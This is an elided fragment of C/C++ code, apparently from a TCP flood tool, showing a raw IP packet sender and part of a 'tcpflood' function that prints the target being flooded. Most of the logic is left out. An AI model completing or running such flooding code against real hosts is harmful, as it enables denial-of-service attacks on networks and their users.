...
// Send raw IP packet
void send_raw_ip_packet(char *packet, int packet_len,
  ...
  if (sendto(sock, packet, packet_len, 0, (struct sockaddr *)dest,
             sizeof(*dest)) < 0) {
    perror("sendto");
  }
  close(sock);
...
void tcpflood(std::string target, int port) {
  ...
  std::cout << "Flooding " << target << " ("
            << inet_ntoa(*(struct in_addr *)&dest_ip) << ":" << port << ")"
            << std::endl;
